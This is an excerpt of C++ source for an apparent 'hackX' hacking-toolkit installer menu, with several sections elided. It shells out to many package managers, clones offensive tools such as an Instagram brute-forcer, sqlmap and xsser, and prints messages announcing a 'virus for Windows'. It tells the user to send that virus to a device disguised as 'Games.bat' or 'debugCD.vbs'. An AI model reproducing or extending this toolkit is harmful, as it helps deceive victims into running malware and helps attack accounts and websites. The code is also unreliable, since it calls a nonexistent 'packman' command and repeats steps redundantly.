...
int main(){
	...
	if(1 == n){
		...
		cin >> sp;
		if(sp == 1){
			system("apt install g++");
			system("apt-get install clang");
			system("apt-get install clang++");
			system("packman install clang");
			system("packman install clang++");
			system("pkg install clang");
			system("pkg install clang++");
			system("yum install clang");
			system("yum install clang++");
			system("dnf install clang");
			system("dnf install clang++");
			system("pacman -S clang");
			system("pacman -S clang++");
			system("pkg install clang");
			system("pkg install clang++");
			system("pkg_add clang");
			system("pkg_add clang++");
			int vus;
			system("clear");
			...
			system("echo '\033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m'");
			...
			system("mv ~/hackX/a.out ~/hackX/hackx.run");
			cout << "  \033[1;32mCreated virus for Windows\033[1;m";
			system("echo '\033[1;36mHelp: File Name Games.bat and Must you send virus a device\033[1;m'");
			system("echo '\033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m'");
			printf("\n \033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
			cout << __TIME__ << "\n";
			cout << "Bye";
			...
			system("echo '\033[1;36mHelp: File Name debugCD.vbs and Must you send virus a device\033[1;m'");
			system("echo '\033[1;31mAttention: Must be device Windows and must disable firewall\033[1;m'");
			printf("\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
			cout << __TIME__ << "\n";
			cout << "Bye";
			...
			system("echo '\033[1;31mAttention: must be device Linux\033[1;m'");
			printf("\n\033[1;32m((((([[[[[[Success In Load]]]]])))))\033[1;m\n \a");
			cout << __TIME__ << "\n";
			cout << "Bye";
		}
		...
		system("pkg install git");
		system("pkg_add git");
		system("git clone https://github.com/stamparm/fetch-some-proxies.git");
		...
		system("pkg install git");
		system("pkg_add git");
		system("git clone https://github.com/thelinuxchoice/instainsane.git");
		...
		system("pkg install git");
		system("pkg_add git");
		system("git clone https://github.com/s0md3v/Breacher.git");
		...
		system("packman update");
		system("pkg update");
		system("yum update");
		system("dnf update");
		system("pacman -S update");
		system("pkg update");
		system("pkg_add update");
		system("apt install nmap");
		system("apt-get install nmap");
		system("packman install nmap");
		system("pkg install nmap");
		system("yum install nmap");
		system("dnf install nmap");
		system("pacman -S nmap");
		system("pkg install nmap");
		system("pkg_add nmap");
		system("clear");
		...
		system("packman install python2");
		system("pkg install python2");
		system("yum install python2");
		system("dnf install python2");
		system("pacman -S python2");
		system("pkg install python2");
		system("pkg_add python2");
		system("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev");
		...
		string str5;
		string s5;
		system("apt install httrack");
		system("apt-get install httrack");
		system("packman install httrack");
		system("pkg install httrack");
		system("yum install httrack");
		system("dnf install httrack");
		system("pacman -S httrack");
		system("pkg install httrack");
		system("pkg_add httrack");
		...
		system("pkg install git");
		system("pkg_add git");
		system("apt install python-pip");
		system("apt-get install python");
		system("apt-get install python-pip");
		system("packman install python2");
		system("pkg install python2");
		system("yum install python2");
		system("yum install python");
		system("dnf install python2");
		system("pacman -S python2");
		system("pkg install python2");
		system("pkg_add python2");
		system("git clone https://github.com/epsylon/xsser.git");
		system("apt-get install python-pycurl python-xmlbuilder python-beautifulsoup python-geoip");
		...
		system("pkg install python2");
		system("pkg_add python2");
		system("git clone https://github.com/narbehaj/ssl-checker.git");
